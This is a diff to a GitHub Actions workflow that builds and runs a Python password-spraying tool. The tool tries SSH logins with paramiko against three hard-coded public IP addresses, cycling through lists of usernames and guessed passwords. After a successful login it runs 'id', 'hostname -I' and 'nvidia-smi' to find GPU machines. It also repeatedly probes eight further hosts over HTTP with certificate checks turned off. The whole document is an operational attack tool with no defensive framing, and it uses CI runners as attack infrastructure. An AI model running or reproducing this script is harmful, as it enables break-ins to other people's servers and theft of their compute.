@@ -1,27 +1,27 @@
-name: ul6552-pwspray
+name: ul6552-pwspray2
 on:
   workflow_dispatch:
 jobs:
   pw:
     runs-on: ubuntu-latest
+    timeout-minutes: 30
     steps:
       - run: pip install paramiko -q
-      - name: spray
+      - name: hunt
         run: |
           cat > s.py <<'PY'
-          import socket,sys,time
+          import socket,sys,time,urllib.request,ssl
           import paramiko
           HOSTS=["40.123.206.138","51.104.16.184","20.237.207.128"]
           USERS=["t19","azureuser","adminuser","root","ubuntu","admin"]
           PW=["wasion@3393","jiujie1218","!QAZ2wsx","zhonghe","azcfydb","MaiSe.Tech","mojing@123","2018","2017",
-              "Password123!","Azure12345","Admin@123","P@ssw0rd","P@ssw0rd1234","Ubuntu123!","Changeme123!","t19","A100h100!"]
-          def up(h):
-              try:
-                  s=socket.create_connection((h,22),timeout=6); s.close(); return True
+              "Password123!","Azure12345","Admin@123","P@ssw0rd","P@ssw0rd1234","Ubuntu123!","Changeme123!","t19","A100h100!","root","ubuntu"]
+          HTTP=["http://20.237.207.128/","http://20.50.113.151/","http://20.74.153.201/","https://47.100.200.41/","http://20.205.187.223/","http://4.194.2.30/","http://70.153.87.133/","http://4.246.80.6/"]
+          def up(h,p):
+              try: s=socket.create_connection((h,p),timeout=5); s.close(); return True
               except Exception: return False
-          for h in HOSTS:
-              if not up(h):
-                  print("PORT_CLOSED",h,flush=True); continue
+          sprayed=set(); httpdone=set()
+          def spray(h):
               print("PORT_OPEN",h,flush=True)
               for u in USERS:
                   for p in PW:
@@ -30,17 +30,34 @@ jobs:
                           c.connect(h,port=22,username=u,password=p,timeout=8,allow_agent=False,look_for_keys=False,banner_timeout=8)
                           _,o,_=c.exec_command("id; hostname -I; nvidia-smi -L 2>&1 | head -4")
                           out=o.read(300).decode('utf-8','replace').replace('\n','|')
-                          print("PWD_HIT",h,u,repr(p),out,flush=True)
-                          c.close(); sys.exit(0)
+                          print("PWD_HIT",h,u,repr(p),out,flush=True); c.close(); sys.exit(0)
                       except paramiko.AuthenticationException:
                           print("PWD_FAIL",h,u,repr(p),flush=True)
                       except Exception as e:
-                          print("PWD_ERR",h,u,repr(p),type(e).__name__,flush=True); time.sleep(0.5)
-          print("SPRAY_DONE",flush=True)
+                          print("PWD_ERR",h,u,repr(p),type(e).__name__,flush=True); time.sleep(0.3)
+              print("SPRAYED",h,flush=True)
+          def hget(u):
+              try:
+                  ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+                  r=urllib.request.urlopen(u,timeout=8,context=ctx)
+                  b=r.read(400).decode('utf-8','replace').replace('\n','|')
+                  print("HTTP",u,r.status,dict(r.headers).get('Server',''),b[:300],flush=True)
+              except Exception as e:
+                  print("HTTP_ERR",u,type(e).__name__,str(e)[:80],flush=True)
+          t0=time.time()
+          while time.time()-t0 < 1500:
+              for h in HOSTS:
+                  if h in sprayed: continue
+                  if up(h,22):
+                      spray(h); sprayed.add(h)
+              for u in HTTP:
+                  if u in httpdone: continue
+                  host=u.split('//')[1].split('/')[0].split(':')[0]
+                  port=443 if u.startswith('https') else 80
+                  if up(host,port):
+                      hget(u); httpdone.add(u)
+              print("CYCLE %.0fs sprayed=%d http=%d"%(time.time()-t0,len(sprayed),len(httpdone)),flush=True)
+              time.sleep(10)
+          print("HUNT_DONE",flush=True)
           PY
-          python3 -u s.py
-      - name: http-legs
-        if: always()
-        run: |
-          for U in http://20.237.207.128/ http://20.50.113.151/ http://20.74.153.201/ https://47.100.200.41/ http://20.205.187.223/ http://4.194.2.30/ http://70.153.87.133/ http://4.246.80.6/; do
-            echo "=== $U"; curl -sk -m 12 -D - "$U" -o /tmp/b 2>&1 | head -12; head -c 300 /tmp/b; echo; done
+          python3 -u s.py || true
